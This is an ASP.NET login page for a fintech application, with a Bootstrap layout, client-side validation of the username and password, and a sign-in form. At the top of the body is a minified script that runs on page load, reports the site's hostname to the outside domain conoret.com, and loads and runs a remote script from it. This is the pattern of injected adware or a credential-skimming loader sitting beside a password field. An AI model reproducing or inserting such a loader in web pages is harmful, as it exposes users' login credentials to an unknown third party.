﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="LoginPage.aspx.cs" Inherits="LoginPage" %>

<!doctype html>
<html lang="en">
<head id="Head1" runat="server">
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link href="Content/CSS/bootstrap.css" rel="stylesheet" type="text/css" />
    <link href="Content/CSS/font-awesome.css" rel="stylesheet" type="text/css" />
    <link href="Content/CSS/style_sheet.css" rel="stylesheet" type="text/css" />
    <link href="Content/CSS/custom.css" rel="stylesheet" type="text/css" />
    <link href="Content/CSS/style.css" rel="stylesheet" type="text/css" />
    

 

    <script type="text/javascript">
        function ValidateMe() {
            var strUNameReq = "", strPwdREq = "";
            var strValue = new String(document.getElementById("txtUserCode").value);
            var bChecked = false;


            if (!bChecked) {
                strValue = strValue.trim();
                if (strValue == "" || strValue == "Username") {
                    //alert("Please enter the Username.");
                    alert("Please enter the username.");
                    document.getElementById("txtUserCode").value = "";
                    document.getElementById("txtUserCode").focus();
                    return false;
                }
                strValue = new String(document.getElementById("txtPassword").value);
                strValue = strValue.trim();
                if (strValue == "" || strValue == "Password") {
                    //alert("Please enter the Password.");
                    alert("Please enter the password.");
                    document.getElementById("txtPassword").value = "";
                    $('#passwordclear').hide();
                    $('#txtPassword').show();
                    $('#txtPassword').focus();
                    return false;
                }
                strValue = encodeURI(strValue);
                document.getElementById("txtPassword").maxlength = strValue.length
                document.getElementById("txtPassword").value = strValue;
            }
            else {

            }

            return true;
        }
    </script>
</head>
    <!--onload="DoOnLoad();generateCaptcha();"-->
<body class="vcloginbody"  data-new-gr-c-s-check-loaded="14.1100.0" data-gr-ext-installed="">
    <script type="text/javascript">window.top === window && !function () { var e = document.createElement("script"), t = document.getElementsByTagName("head")[0]; e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e) }();</script>

    <div class="container-fluid " id="divLoginBox" style="overflow-y: auto; height: calc(100vh - 40px);">

        <div class="row m-3 mt-3" >

            <div class="col-12 col-md-6 m-0 p-0 img-cover d-none d-sm-block">
                <div class="h-100 w-100">
                    <img src="Content/Login/Images/login_bg.png" class="img-cover" alt="..." />
                </div>
            </div>
            <div class="col-12 col-md-6  m-0 p-0 d-flex flex-column justify-content-center mt-2">
                <form id="form1" runat="server">
                    <div>
                        <div class="row m-0 p-0">
                            <div class="col d-flex justify-content-center login-logo">
                                <img src="Content/Images/s3g_logo_icon_no_bg.png" alt="..."/>
                            </div>
                        </div>
                        <div class="row m-0 p-0 mt-3">
                            <div class="col d-flex justify-content-center">
                                <span class="welcome-login">Welcome to Smart Fintech Solutions</span>
                            </div>
                        </div>
                        <div class="row m-0 p-0 mt-2">
                            <div class="col d-flex justify-content-center">
                                <span class="app-info">The purpose of software is to succour people.</span>
                            </div>
                        </div>
                        <div class="row m-0 p-0 mt-4">
                            <div class="col d-flex justify-content-center">
                                <span class="sign-you">Let’s sign you in</span>
                            </div>
                        </div>

                        <div class="row mt-3 m-0 p-0 d-flex justify-content-center overflow-hidden">
                            <div class="col-12 col-md-8 form-group" id="divEnviornment">
                                <label>Enviornment</label>
                                <asp:TextBox ID="lblEnvironment" runat="server" ReadOnly="true" MaxLength="30" TabIndex="1" CssClass="LgInput form-control" ></asp:TextBox>

                            </div>
                            <div class="col-12 col-md-8  form-group" id="divUserName">
                                <label>User Name</label>
                                <asp:TextBox ID="txtUserCode" runat="server" MaxLength="30" TabIndex="1" CssClass="LgInput form-control" ></asp:TextBox>
                            </div>
                            <div class="col-12 col-md-8  form-group" id="divPwd">
                                <label>Password</label>
                                <asp:TextBox ID="txtPassword" runat="server" MaxLength="50" TextMode="Password" TabIndex="1" CssClass="LgInput form-control" ></asp:TextBox>
                                <small class="float-right"><a href="#" class="forgotpwd"><i class="fa fa-question-circle-o" aria-hidden="true"></i>  Forgot Password</a></small>
                            </div>

                            <div class="col-12 col-md-8 ">
                                <asp:LinkButton ID="btnLogin" runat="server"
                                    CssClass="w-100 btn btn-success"
                                    OnClientClick="return ValidateMe();"
                                    OnClick="imgbtnLogin_Click">
     Login <i class="fa fa-sign-in" aria-hidden="true"></i>
                                </asp:LinkButton>

                            </div>

                        </div>
                        

                    </div>
                </form>

            </div>

        </div>

    </div>
    <div class="footer">© 2025 <a id="vcFooterLink" href="http://www.vicisoft.com/" target="_blank">Smart-Solutions LLC.</a> All Rights Reserved.</div>

</body>

</html>


